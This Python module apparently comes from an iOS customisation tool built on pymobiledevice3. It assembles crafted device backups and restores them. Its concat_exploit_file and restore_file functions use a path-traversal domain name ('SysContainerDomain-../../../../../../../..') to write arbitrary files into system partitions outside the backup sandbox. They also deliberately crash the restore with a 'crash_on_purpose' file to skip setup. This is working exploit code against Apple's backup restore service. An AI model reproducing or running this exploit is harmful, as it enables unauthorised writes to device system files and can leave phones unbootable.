from . import backup, perform_restore
from .mbdb import _FileMode
from pymobiledevice3.lockdown import LockdownClient
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from pymobiledevice3.exceptions import ConnectionTerminatedError
import os
import plistlib
import ssl

class FileToRestore:
    def __init__(self,
                 contents: str, restore_path: str, contents_path: str = None, domain: str = "",
                 owner: int = 501, group: int = 501, mode: _FileMode = None
                ):
        self.contents = contents
        self.contents_path = contents_path
        self.restore_path = restore_path
        self.domain = domain
        self.owner = owner
        self.group = group
        self.mode = mode

def concat_exploit_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str) -> str:
    base_path = ""
    # set it to work in the separate volumes (prevents a bootloop)
    if file.restore_path.startswith("/var/mobile/"):
        # required on iOS 17.0+ since /var/mobile is on a separate partition
        base_path = "/var/mobile/backup"
    elif file.restore_path.startswith("/private/var/mobile/"):
        base_path = "/private/var/mobile/backup"
    elif file.restore_path.startswith("/private/var/"):
        base_path = "/private/var/backup"
    # don't append the directory if it has already been added (restore will fail)
    path, name = os.path.split(file.restore_path)
    domain_path = f"SysContainerDomain-../../../../../../../..{base_path}{path}/"
    new_last_domain = last_domain
    if last_domain != domain_path:
        files_list.append(backup.Directory(
            "",
            f"{domain_path}",
            owner=file.owner,
            group=file.group
        ))
        new_last_domain = domain_path
    files_list.append(backup.ConcreteFile(
        "",
        f"{domain_path}{name}",
        owner=file.owner,
        group=file.group,
        contents=file.contents
    ))
    return new_last_domain

def concat_regular_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str, last_path: str):
    path, name = os.path.split(file.restore_path)
    paths = path.split("/")
    new_last_domain = last_domain
    # append the domain first
    if last_domain != file.domain:
        files_list.append(backup.Directory(
            "",
            file.domain,
            owner=file.owner,
            group=file.group
        ))
        last_path = ""
        new_last_domain = file.domain
    # append each part of the path if it is not already there
    full_path = ""
    mode = file.mode
    if mode == None:
        mode = backup.DEFAULT
    for path_item in paths:
        if full_path != "":
            full_path += "/"
        full_path += path_item
        if not last_path.startswith(full_path):
            files_list.append(backup.Directory(
                full_path,
                file.domain,
                owner=file.owner,
                group=file.group,
                mode=mode
            ))
            last_path = full_path
    # finally, append the file
    files_list.append(backup.ConcreteFile(
        f"{full_path}/{name}",
        file.domain,
        owner=file.owner,
        group=file.group,
        contents=file.contents,
        src_path=file.contents_path,
        mode=mode
    ))
    return new_last_domain, full_path

# merge all files that have duplicates and returns the list without duplicates
def merge_duplicates(original_files: list[FileToRestore]) -> list[FileToRestore]:
    no_dupe_files: list[FileToRestore] = []
    existing_locations: dict[str: int] = {}
    for file in original_files:
        if file.domain == None:
            file_loc = "-"
        else:
            file_loc = file.domain + '-'
        restore_path = file.restore_path
        if file.restore_path.startswith('/'):
            restore_path = restore_path.removeprefix('/')
        file_loc += restore_path
        if file_loc in existing_locations:
            if not restore_path.endswith('.plist'):
                print(f'cannot merge duplicate file, ignoring {file_loc}')
                continue
            # merge the data (plist files only)
            print(f'merging duplicate files for {file_loc}')
            initial_data = plistlib.loads(no_dupe_files[existing_locations[file_loc]].contents)
            added_data = plistlib.loads(file.contents)
            initial_data.update(added_data)
            no_dupe_files[existing_locations[file_loc]].contents = plistlib.dumps(initial_data)
            del initial_data, added_data
        else:
            # add it to the no dupes list
            no_dupe_files.append(file)
            existing_locations[file_loc] = len(no_dupe_files) - 1
    return no_dupe_files

# files is a list of FileToRestore objects
def restore_files(files: list[FileToRestore], reboot: bool = False, lockdown_client: LockdownClient = None, progress_callback = lambda x: None):
    # create the files to be backed up
    files_list = [
    ]
    apps_list = []
    active_bundle_ids = []
    apps = None
    sorted_files = sorted(merge_duplicates(files), key=lambda x: (x.domain, x.restore_path), reverse=False)
    # add the file paths
    last_domain = ""
    last_path = ""
    exploit_only = True
    for file in sorted_files:
        if file.domain == "" or file.domain == "z":
            last_domain = concat_exploit_file(file, files_list, last_domain)
        else:
            last_domain, last_path = concat_regular_file(file, files_list, last_domain, last_path)
            exploit_only = False
            # add the app bundle to the list
            if last_domain.startswith("AppDomain"):
                bundle_id = last_domain.removeprefix("AppDomain-")
                if not bundle_id in active_bundle_ids:
                    if apps == None:
                        apps = InstallationProxyService(lockdown=lockdown_client).get_apps(application_type="Any", calculate_sizes=False)
                    app_info = apps[bundle_id]
                    active_bundle_ids.append(bundle_id)
                    apps_list.append(backup.AppBundle(
                        identifier=bundle_id,
                        path=app_info["Container"],
                        version=app_info["CFBundleVersion"],
                        container_content_class="Data/Application"
                    ))

    # crash the restore to skip the setup (only works for exploit files)
    if exploit_only:
        files_list.append(backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""))

    # create the backup
    back = backup.Backup(files=files_list, apps=apps_list)

    for fi in files_list:
        print(f"{fi.domain}, {fi.path}")

    try:
        perform_restore(backup=back, reboot=reboot, lockdown_client=lockdown_client, progress_callback=progress_callback)
    except (ConnectionTerminatedError, ssl.SSLEOFError, ConnectionAbortedError, ConnectionResetError):
        # These errors usually mean the device rebooted successfully before acknowledging the restore.
        # We catch them and treat the process as successful.
        print("Device disconnected during restore - this is expected as the device reboots.")
        
        if progress_callback:
            progress_callback(100)
            
    except Exception as e:
        # If it's a different error, we still want to see it
        raise e


def restore_file(fp: str, restore_path: str, restore_name: str, reboot: bool = False, lockdown_client: LockdownClient = None):
    # open the file and read the contents
    contents = open(fp, "rb").read()

    base_path = "/var/backup"
    if restore_path.startswith("/var/mobile/"):
        # required on iOS 17.0+ since /var/mobile is on a separate partition
        base_path = "/var/mobile/backup"

    # create the backup
    back = backup.Backup(files=[
        # backup.Directory("", "HomeDomain"),
        # backup.Directory("Library", "HomeDomain"),
        # backup.Directory("Library/Preferences", "HomeDomain"),
        # backup.ConcreteFile("Library/Preferences/temp", "HomeDomain", owner=501, group=501, contents=contents, inode=0),
        backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../..{base_path}{restore_path}",
                owner=501,
                group=501
            ),
        backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../..{base_path}{restore_path}{restore_name}",
                owner=501,
                group=501,
                contents=contents#b"",
                # inode=0
            ),
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
    ])

    try:
        perform_restore(backup=back, reboot=reboot, lockdown_client=lockdown_client)
    except (ConnectionTerminatedError, ssl.SSLEOFError, ConnectionAbortedError, ConnectionResetError):
        pass